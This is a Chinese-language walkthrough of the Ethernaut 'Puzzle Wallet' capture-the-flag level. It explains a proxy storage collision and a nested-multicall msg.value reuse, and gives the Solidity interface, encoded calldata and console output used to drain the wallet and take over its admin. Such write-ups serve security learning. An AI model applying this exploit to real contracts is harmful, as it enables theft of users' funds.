# 25 Puzzle Wallet

## 思路

### 目标

让`player`成为`PuzzleProxy`的`admin`



```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "../helpers/UpgradeableProxy-08.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) {
        admin = _admin;
    }

    modifier onlyAdmin {
      require(msg.sender == admin, "Caller is not the admin");
      _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      require(address(this).balance == 0, "Contract balance is not 0");
      maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
      require(address(this).balance <= maxBalance, "Max balance reached");
      balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success, ) = to.call{ value: value }(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
```



### 思路:

#### 基础

首先题目中的代码使用了一个叫做"Proxy Pattern"的模式用于合约升级, 参考这里: https://github.com/yinhui1984/SolidityReference/blob/main/docs/proxy.md



其次, 在浏览器控制台中我们可以使用`contract` 或 `instance` 变量来获取题目给的合约对象或合约地址, 而貌似并没有看到`PuzzleProxy`合约的对象或地址. 

这里需要说明的是, 控制台的`instance`就是`proxy`的地址, 原因? 

第一, 根据代理模式用于可升级合约这一目的出发, 暴露给外部用户的肯定是代理, 而不是可升级合约本身的某个版本的合约地址. 这和设计模式中的`代理模式`一样

第二, 可以参考题目的[源代码如果构造题目实例](https://github.com/OpenZeppelin/ethernaut/blob/e2536a8072a72e146b3a22c6f021ae1ffc948288/contracts/contracts/levels/PuzzleWalletFactory.sol#L14-L19)的

![image](https://github.com/yinhui1984/imagehosting/blob/main/images/1676706287930501000.png?raw=true)

OK, 在理解了代理模式之后, 我们知道可以通过代理来访问题目中所有可访问的状态变量和函数

#### 题目合约中的问题

题目中`admin`的值只能由构造函数传入或由上一任`admin`批准某个地址成为新的admin, 逻辑上无懈可击. 但是, 题目中的合约犯了一个最基本的错误: 存储碰撞 (storage collision)

```solidity
contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;
    //...
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    //...
}
```

`PuzzleProxy`的前两个状态变量和 `PuzzleWallet`的前两个状态变量存在存储碰撞, 关注这个问题可以google [smart contract storage collision](https://www.google.com/search?q=smart+contract+storage+collision&source=hp&ei=HITwY4f5IpX7-Qa7-KuADg&iflsig=AK50M_UAAAAAY_CSLLY1pZjvNveca5lN1bWV-xqMBs7k&ved=0ahUKEwiH9_Pey579AhWVfd4KHTv8CuAQ4dUDCA4&uact=5&oq=smart+contract+storage+collision&gs_lcp=Cgdnd3Mtd2l6EAMyBQghEKABMgUIIRCgAVAAWABg4gJoAHAAeACAAeUBiAHlAZIBAzItMZgBAKABAqABAQ&sclient=gws-wiz)

总之, `PuzzleProxy`的 `pendingAdmin`和`owner`使用了同一个存储位置, 同理, `maxBalance`和 `admin`使用了同一个存储位置

所以, 基本思路就出来了:

1,  通过修改 `PuzzleProxy`的 `pendingAdmin`为`player` , 使 `player`成为 `PuzzleWallet`的`owner`, 从而获得`PuzzleWallet`中各个函数的执行权限

2, 然后通过修改`PuzzleWallet`中的`maxBalance` 为 `player`  (不用在意数据类型不一样, 数据类型是可以转换的). 从而让`PuzzleProxy`的`admin`更新为 `player`



### 参考步骤

#### 从浏览器控制台中获取`instance`和`player` 地址

```
> instance
"0xf766B11a662ca71Cd7F4acB41d0EA6AB486F4564"
> player
"0x37bd42f4cF5785F5A36244e4800636cE5787d5e8"
```



#### 构造访问接口

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;


interface IProxy {
    //Puzzleproxy部分
    function admin() external view returns (address);
    function proposeNewAdmin(address _newAdmin) external;
    function approveNewAdmin(address _expectedAdmin) external;
    function upgradeTo(address _newImplementation) external;

		//puzzlewallet部分
    function addToWhitelist( address addr ) external   ;
    function balances( address  ) external view returns (uint256 ) ;
    function deposit(  ) external payable  ;
    function execute( address to,uint256 value,bytes memory data ) external payable  ;
    function init( uint256 _maxBalance ) external   ;
    function maxBalance(  ) external view returns (uint256 ) ;
    function multicall( bytes[] memory data ) external payable  ;
    function owner(  ) external view returns (address ) ;
    function setMaxBalance( uint256 _maxBalance ) external   ;
    function whitelisted( address  ) external view returns (bool ) ;
}
```

> 简便方法: 浏览器控制台 `console.log(JSON.stringify(contract.abi))` 可以得到abi,
>
> 然后利用https://github.com/gnidan/abi-to-sol 可以快速生成代码

使用remix的 `At Address` 传入instance地址, 获得访问对象实例

![image](https://github.com/yinhui1984/imagehosting/blob/main/images/1676707783348507000.png?raw=true)



#### 成为 owner

通过调用`PullzeProxy`的`proposeNewAdmin(player)` 从而让 `PuzzleWallet`的`owner`成为`player` (存储碰撞!)

![image](https://github.com/yinhui1984/imagehosting/blob/main/images/1676708069637652000.png?raw=true)



#### 成为admin

逻辑非常的绕:

要成为admin , 需要调用`setMaxBalance(player)`,  但需要满足`require(address(this).balance == 0` 

所以需要使用钱包的上下文来调用 `execute`利用其中的的`to.call{ value: value }` 将钱包的余额消耗掉(即将钱包的余额发送给`to`)

要利用钱包的上下文,  则可以使用`address(wallet_address).delegatecall` , 也就是调用`multicall`

要成功调用`execute`,  则需要满足 `require(balances[msg.sender] >= value, "Insufficient balance");` 也就是 `require(balances[wallet_address] >= value, "Insufficient balance"`

目前的情况是 `balances[wallet_address]` 为0 ,  ` address(wallet_address).balance`为0.001ether

要 `balances[wallet_address]` 大于或等于我们需要消耗掉的value, 则需要调用通过delegatecall(也就是通过`multicall`)来调用 `deposit()`以更新`balances[wallet_address]`的值



> 关键点: 如果不正确处理，对消耗ETH的操作进行迭代会导致问题。即使花费了ETH，msg.value也会保持不变，所以开发者必须在每次迭代时手动跟踪实际的剩余金额。在使用多调用模式(multi-call)时，这也会导致问题，因为对一个本身看起来很安全的函数执行多个委托调用，可能会导致不需要的ETH转移，因为委托调用会保持发送到合约的原始msg.value。



<img src="https://github.com/yinhui1984/imagehosting/blob/main/images/1676866951112113000.png?raw=true" alt="image" style="zoom:50%;" />





```solidity
        bytes[] memory depositSelector = new bytes[](1);
        depositSelector[0] = abi.encodeWithSelector(proxy.deposit.selector); //0xd0e30db0
        bytes[] memory nestedMulticall = new bytes[](2);
        nestedMulticall[0] = abi.encodeWithSelector(proxy.deposit.selector); //0xd0e30db0

        //0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000
        nestedMulticall[1] = abi.encodeWithSelector(proxy.multicall.selector, depositSelector);

```

使用编码后的参数调用multicall, 参数为

```
["0xd0e30db0","0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000"]
```





![image](https://github.com/yinhui1984/imagehosting/blob/main/images/1676867867050403000.png?raw=true)



![image](https://github.com/yinhui1984/imagehosting/blob/main/images/1676868241590320000.png?raw=true)



将player地址转换为uint256, 比如 0x37bd42f4cF5785F5A36244e4800636cE5787d5e8 转换后为318215165953207128467949000302095245846828799464, 传入`setMaxBalance`

![image](https://github.com/yinhui1984/imagehosting/blob/main/images/1676868314768135000.png?raw=true)



```
instance
"0x184Fc673ee56533c2f14E0A44A8d841aE1E89B33"
player
"0x37bd42f4cF5785F5A36244e4800636cE5787d5e8"
redux-logger.js:1  action SET_BLOCK_NUM @ 12:34:20.003
redux-logger.js:1  action SET_BLOCK_NUM @ 12:35:39.976
redux-logger.js:1  action SET_BLOCK_NUM @ 12:36:59.927
redux-logger.js:1  action SET_GAS_PRICE @ 12:37:20.006
redux-logger.js:1  action SET_BLOCK_NUM @ 12:40:19.997
redux-logger.js:1  action SET_BLOCK_NUM @ 12:42:59.925
redux-logger.js:1  action SET_BLOCK_NUM @ 12:43:19.994
^^.js:45 ˁ(⦿ᴥ⦿)ˀ 正在提交关卡实例... <  < <<请稍等>> >  >
redux-logger.js:1  action SUBMIT_LEVEL_INSTANCE @ 12:49:20.535
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x4240c29036e1b075097306fe77204494a2cf280c35f8e5c99da9ba1a7b8acd18
^^.js:73 ٩(- ̮̮̃-̃)۶ 牛逼！, 你通过了这关!!!
^^.js:73 ٩(- ̮̮̃-̃)۶ 牛逼！, 你通过了这关!!!
^^.js:73 ٩(- ̮̮̃-̃)۶ 牛逼！, 你通过了这关!!!
^^.js:73 ٩(- ̮̮̃-̃)۶ 牛逼！, 你通过了这关!!!
^^.js:73 ٩(- ̮̮̃-̃)۶ 牛逼！, 你通过了这关!!!
^^.js:73 ٩(- ̮̮̃-̃)۶ 牛逼！, 你通过了这关!!!
^^.js:73 ٩(- ̮̮̃-̃)۶ 牛逼！, 你通过了这关!!!
^^.js:73 ٩(- ̮̮̃-̃)۶ 牛逼！, 你通过了这关!!!
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x4240c29036e1b075097306fe77204494a2cf280c35f8e5c99da9ba1a7b8acd18
^^.js:73 ٩(- ̮̮̃-̃)۶ 牛逼！, 你通过了这关!!!
^^.js:73 ٩(- ̮̮̃-̃)۶ 牛逼！, 你通过了这关!!!
^^.js:73 ٩(- ̮̮̃-̃)۶ 牛逼！, 你通过了这关!!!
^^.js:73 ٩(- ̮̮̃-̃)۶ 牛逼！, 你通过了这关!!!
^^.js:73 ٩(- ̮̮̃-̃)۶ 牛逼！, 你通过了这关!!!
^^.js:73 ٩(- ̮̮̃-̃)۶ 牛逼！, 你通过了这关!!!
^^.js:73 ٩(- ̮̮̃-̃)۶ 牛逼！, 你通过了这关!!!
^^.js:73 ٩(- ̮̮̃-̃)۶ 牛逼！, 你通过了这关!!!
^^.js:73 ٩(- ̮̮̃-̃)۶ 牛逼！, 你通过了这关!!!
^^.js:73 ٩(- ̮̮̃-̃)۶ 牛逼！, 你通过了这关!!!
^^.js:73 ٩(- ̮̮̃-̃)۶ 牛逼！, 你通过了这关!!!
^^.js:73 ٩(- ̮̮̃-̃)۶ 牛逼！, 你通过了这关!!!
^^.js:56 
redux-logger.js:1  action SET_BLOCK_NUM @ 12:49:29.693

```

